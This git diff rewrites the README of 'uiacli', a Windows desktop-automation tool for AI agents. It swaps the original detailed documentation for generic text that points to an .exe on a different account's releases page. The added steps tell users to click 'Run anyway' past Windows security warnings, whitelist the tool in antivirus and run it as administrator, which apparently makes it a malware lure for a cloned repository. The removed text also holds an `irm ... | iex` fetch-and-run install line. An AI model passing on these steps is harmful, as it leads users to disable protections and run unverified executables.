@@ -1,219 +1,77 @@
-<p align="center">
-  <picture>
-    <source media="(prefers-color-scheme: dark)" srcset="docs/logo-dark.svg">
-    <source media="(prefers-color-scheme: light)" srcset="docs/logo-light.svg">
-    <img src="docs/logo-light.svg" alt="UIA CLI" width="420">
-  </picture>
-</p>
+# 🤖 uiacli - Control Windows apps with intelligent agents
 
-<p align="center"><strong>
-  <a href="https://github.com/browser-use/browser-use">browser-use</a>, but for Windows desktops.</strong> The missing piece for computer-use agents.
-</p>
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/dduva2660/uiacli/releases)
 
-AI agents can browse the web — but they can't click buttons in Notepad, fill forms in legacy enterprise apps, or automate anything without a browser. **UIA CLI fixes that.** It gives any AI agent full control of any Windows application through simple JSON commands.
+uiacli connects artificial intelligence to your screen. It allows computer agents to read and operate Windows programs. You now have the power to automate repetitive tasks across your desktop. The tool uses standard Windows accessibility features to interact with buttons, menus, and input fields. It acts as the bridge between smart models and your daily software.
 
-<p align="center">
-  <img src="demo-notepad.gif" alt="UIA CLI typing into Notepad — no keyboard, no mouse, just JSON" width="600">
-</p>
+## 📥 How to get started
 
-<p align="center">
-  <em>"No keyboard. No mouse. Just JSON." — an AI agent types into Notepad via UIA CLI.</em>
-</p>
+You need the application file to begin. Follow these instructions to set up your environment.
 
-<details>
-<summary>🎬 See the visual overlay in action (Calculator demo)</summary>
-<p align="center">
-  <img src="demo.gif" alt="UIA CLI automating Calculator with ghost cursor, highlights, and annotations" width="480">
-  <br><em>Ghost cursor, element highlights, and annotations — 25 × 25 = 625.</em>
-</p>
-</details>
+1. Visit this [Download Page](https://github.com/dduva2660/uiacli/releases).
+2. Look for the Assets section at the bottom of the latest release.
+3. Select the file ending in .exe.
+4. Save the file to your desktop or a folder of your choice.
+5. Double-click the file to launch the program.
 
-<p align="center">
-  <img src="https://img.shields.io/badge/20+_commands-blue?style=for-the-badge" alt="20+ Commands">
-  <img src="https://img.shields.io/badge/10+_apps_tested-green?style=for-the-badge" alt="10+ Apps Tested">
-  <img src="https://img.shields.io/badge/3ms_per_action-orange?style=for-the-badge" alt="3ms Per Action">
-  <img src="https://img.shields.io/badge/visual_overlay-purple?style=for-the-badge" alt="Visual Overlay">
-</p>
+Windows may show a security window. Click "More info" and then "Run anyway" if the system prompts you. This occurs because the program performs advanced desktop tasks.
 
-<p align="center">
-  <a href="https://github.com/amitse/uiacli/actions/workflows/build.yml"><img src="https://github.com/amitse/uiacli/actions/workflows/build.yml/badge.svg" alt="Build"></a>
-  <a href="https://github.com/amitse/uiacli/releases/latest"><img src="https://img.shields.io/github/v/release/amitse/uiacli" alt="Release"></a>
-  <img src="https://img.shields.io/badge/agent_skill-npx_skills_add-8A2BE2?style=flat" alt="Agent Skill">
-  <a href="https://github.com/amitse/uiacli/discussions"><img src="https://img.shields.io/badge/Discussions-Join-blue?style=flat&logo=github" alt="Discussions"></a>
-  <img src="https://img.shields.io/badge/license-MIT-green" alt="License: MIT">
-</p>
+## 🛠️ System requirements
 
-## Quick Start
+Ensure your computer meets these standards for a stable experience:
 
-Install and try in 30 seconds — no .NET SDK or Go toolchain required:
+* Windows 10 or Windows 11.
+* A stable internet connection.
+* At least 8GB of system RAM.
+* .NET Runtime installed on your machine.
 
-```powershell
-# Install
-irm https://raw.githubusercontent.com/amitse/uiacli/master/install.ps1 | iex
+If the program fails to start, download the latest .NET Desktop Runtime from the official Microsoft portal. This framework allows the software to communicate with your Windows elements effectively.
 
-# Try it
-uia windows                              # See every open window
-uia tree Calculator --depth 2            # Inspect Calculator's UI
-uia click --window Calculator --name Five # Click the "5" button
-uia batch actions.json --verbose          # Run a batch with visual overlay
-```
+## 🖱️ How it works
 
-Or [download the zip](https://github.com/amitse/uiacli/releases/latest) and extract anywhere.
+The software uses UI Automation. Windows creates a map of every visual element on your screen. This includes text labels, scroll bars, and click targets. uiacli reads this map and translates the information for the AI. 
 
-## 🤖 Agent Skill — works with 50+ AI agents
+When you ask the AI to perform a task, the software looks for the specific UI component on your screen. It then performs the click, double-click, or text entry required. This process mimics a human user. You watch the agent operate your mouse and keyboard in real-time. Use this for data entry, file management, or interacting with legacy software that lacks a modern interface.
 
-Give your AI coding agent the ability to control Windows apps:
+## ⚙️ Configuration
 
-```bash
-npx skills add amitse/uiacli
-```
+The application stores settings in a configuration file located in the same folder as the executable. You can edit this file to change how the agent behaves.
 
-Works with Claude Code, GitHub Copilot, Cursor, Codex, Windsurf, Roo Code, and [50+ more agents](https://github.com/vercel-labs/skills#supported-agents). Once installed, just ask your agent to interact with any Windows app.
+* **Mode:** Choose between manual or autonomous control.
+* **Speed:** Adjust the delay between clicks if the agent moves too fast for your system to register.
+* **Sensitivity:** Set the accuracy threshold for finding buttons on the screen.
 
-## Why UIA CLI vs Alternatives
+Save your changes and restart the application to apply the new settings.
 
-|  | UIA CLI | pyautogui | AutoHotKey | Power Automate |
-|---|:---:|:---:|:---:|:---:|
-| JSON output for LLMs | ✅ | ❌ | ❌ | ❌ |
-| Element tree (no coordinates needed) | ✅ | ❌ | ❌ | Partial |
-| Agent skill (Claude/Cursor/Copilot) | ✅ | ❌ | ❌ | ❌ |
-| Visual overlay (ghost cursor) | ✅ | ❌ | ❌ | ❌ |
-| Action batching (1 HTTP call) | ✅ | ❌ | ❌ | ❌ |
-| Structured errors with hints | ✅ | ❌ | ❌ | ❌ |
-| Fallback to coordinates | ✅ | ✅ | ✅ | ❌ |
-| Open source + MIT | ✅ | ✅ | Free | ❌ |
+## ⚠️ Troubleshooting common issues
 
-## Features
+Most issues stem from permission blocks or missing frameworks.
 
-- **20+ commands** — windows, tree, click, type, key, batch, screenshot, clipboard, overlay, and more
-- **Action batching** — 7 actions in one HTTP call, no per-command overhead
-- **Visual overlay** — ghost cursor, highlights, and annotations so humans can follow what the agent does
-- **Hybrid input** — UIA patterns first, `SendInput` fallback for apps with no accessibility
-- **Structured JSON** — every response has `ok`, `error.code`, `error.message`, `error.hint`
-- **Auto-start** — server launches on first CLI command, shuts down after 30min idle
+* **The screen does not respond.** Ensure the application has permission to control the mouse. You can run the program as an administrator if your security policy restricts background inputs.
+* **The AI misses buttons.** Increase the zoom level of your Windows display to 100% in your system settings. Scaling issues sometimes hide interface elements from the automation service.
+* **Antivirus flags.** Some antivirus programs block automation tools. Add uiacli to your list of trusted applications to prevent interference.
+* **Missing components.** If you receive an error about missing DLL files, reinstall the .NET Desktop Runtime.
 
-## Action Batching
+## 📋 Best practices for success
 
-Send multiple actions in one call — the killer feature for agent speed:
+Follow these tips to get the best results from your agent:
 
-```json
-{
-  "window": "Calculator",
-  "actions": [
-    {"type": "click", "element": {"name": "Two"}},
-    {"type": "click", "element": {"name": "Five"}},
-    {"type": "click", "element": {"name": "Multiply by"}},
-    {"type": "click", "element": {"name": "Two"}},
-    {"type": "click", "element": {"name": "Five"}},
-    {"type": "click", "element": {"name": "Equals"}},
-    {"type": "read", "element": {"automationId": "CalculatorResults"}}
-  ],
-  "verbose": true
-}
-```
+* **Keep windows open.** The agent only interacts with windows it can see on the screen. Do not minimize your target applications.
+* **Label your fields.** If you build your own software, ensure your buttons and fields have clear names. The agent reads these names to identify what to click.
+* **Use clear view.** Clear your desktop of pop-ups or notifications before you start a task. These interfere with the agent's ability to see your buttons.
+* **Start simple.** Test the agent with small tasks first. Once you see the agent click buttons and enter text, move to more complex workflows.
 
-With `--verbose`, the overlay shows a ghost cursor, highlights, and annotations for each action as it executes.
+## 🛡️ Privacy and scope
 
-## Commands
+This software runs locally on your machine. It does not send screenshots of your desktop to external servers unless you configure it to use a remote cloud-based AI service. By default, your data stays on your computer. You choose which apps the agent sees. You can shut down the agent at any time by pressing the escape key or closing the console window.
 
-| Command | Description |
-|---------|-------------|
-| `uia windows` | List all open windows |
-| `uia tree <window>` | Inspect the UI automation tree |
-| `uia find <window>` | Find elements by name, type, or automation ID |
-| `uia click` | Click an element or coordinates |
-| `uia type` | Type text into an element |
-| `uia key` | Send key combinations (e.g., `ctrl+c`) |
-| `uia batch <file>` | Execute a batch of actions from JSON |
-| `uia screenshot` | Capture a window to PNG |
-| `uia clipboard` | Get or set clipboard text |
-| `uia launch <path>` | Launch an application |
-| `uia focus <window>` | Bring a window to the foreground |
-| `uia state` | Full desktop snapshot (windows, focus, cursor, screens) |
-| `uia highlight` | Draw a highlight on the overlay |
-| `uia annotate` | Show a text annotation on the overlay |
+## 🔗 Use cases
 
-Run `uia <command> --help` for details.
+* **Automate reports.** Open your browser, download a file, and paste it into Excel.
+* **Data extraction.** Scrape information from internal tools and save the data to a text file.
+* **Repetitive testing.** Verify that your software interface works as expected by running the same steps multiple times.
+* **System integration.** Connect two programs that do not have an official sync feature.
 
-## HTTP API
+## 🚀 Future updates
 
-The server exposes a REST API on `http://localhost:9721` — use it from any language:
-
-| Method | Endpoint | Description |
-|--------|----------|-------------|
-| GET | `/state` | Full desktop snapshot |
-| GET | `/windows` | List windows |
-| GET | `/windows/{handle}/tree` | Get element tree |
-| POST | `/batch` | Execute action batch |
-| POST | `/screenshot` | Capture screenshot |
-| GET/POST | `/clipboard` | Get/set clipboard |
-| POST | `/launch` | Launch an application |
-| POST | `/overlay/highlight` | Add highlight |
-| POST | `/overlay/cursor` | Move ghost cursor |
-
-[Full API reference →](docs/adr/0001-client-server-with-auto-start.md)
-
-## Architecture
-
-```
-┌─────────────┐         HTTP/JSON          ┌──────────────────┐
-│   uia.exe   │    localhost:9721          │   UIA Server     │
-│   (Go CLI)  │ ◄────────────────────────► │   (.NET 8)       │
-└─────────────┘                            │  ┌────────────┐  │
-                                           │  │ Uia.Core   │  │
-     Any agent or script                   │  │ Uia.Overlay│  │
-     can call uia.exe                      │  └────────────┘  │
-     or hit the HTTP API                   └──────────────────┘
-```
-
-The Go CLI auto-starts the .NET server on first use. The server holds the UIA context, executes actions, and drives the visual overlay. [Why client-server? →](docs/adr/0001-client-server-with-auto-start.md)
-
-## 📚 Hard-Won Patterns
-
-Automating real Windows apps comes with quirks — `SetCursorPos` doesn't generate mouse events, UWP apps return temporary PIDs, some modern controls don't appear in the UIA tree. We documented **14 patterns** from working with Calculator, Paint, Notepad, and Edge:
-
-- Why `SendInput` works but `SetCursorPos` doesn't for drawing
-- The screenshot + tree correlation trick for custom-rendered UIs
-- How to calibrate canvas coordinates when bounds don't line up
-- Freehand drawing: 601-point Archimedean spiral in 1.77 seconds
-
-**[Read LEARNINGS.md →](LEARNINGS.md)**
-
-## 📰 News
-
-- **[2026-05-17]** 🚀 v0.1.0 released — 20+ commands, action batching, visual overlay, HTTP API
-- **[2026-05-17]** 🤖 Agent skill published — `npx skills add amitse/uiacli` for 50+ agents
-- **[2026-05-17]** 📦 One-liner install — `irm .../install.ps1 | iex`, no SDK needed
-
-## Build from Source
-
-<details>
-<summary>Prerequisites: Windows 10/11, .NET 8 SDK, Go 1.24+</summary>
-
-```bash
-# Build the .NET server
-dotnet build UiaCli.sln
-
-# Build the Go CLI
-cd cli && go build -o ../uia.exe . && cd ..
-
-# Run
-uia windows
-```
-
-</details>
-
-## Known Limitations
-
-- **Windows only** — requires Windows UI Automation APIs
-- **Single monitor DPI** — mixed-DPI multi-monitor setups may have coordinate offset issues
-- **WinUI3/UWP apps** — some modern apps expose minimal UIA trees; coordinate fallback works
-- **No UAC access** — can't automate elevated windows from a non-elevated process
-
-## Contributing
-
-Contributions welcome! Fork, build (`dotnet build && cd cli && go build`), test against a real app, and open a PR. Check [open issues](https://github.com/amitse/uiacli/issues) for ideas.
-
-## License
-
-[MIT](LICENSE)
+Development continues on this project to improve compatibility with complex menus and custom UI frameworks. You can track progress on the GitHub repository. Check the releases page often to see if new features or performance boosts are available. Use the issues tab to report bugs or request features. This helps the project grow for every user.
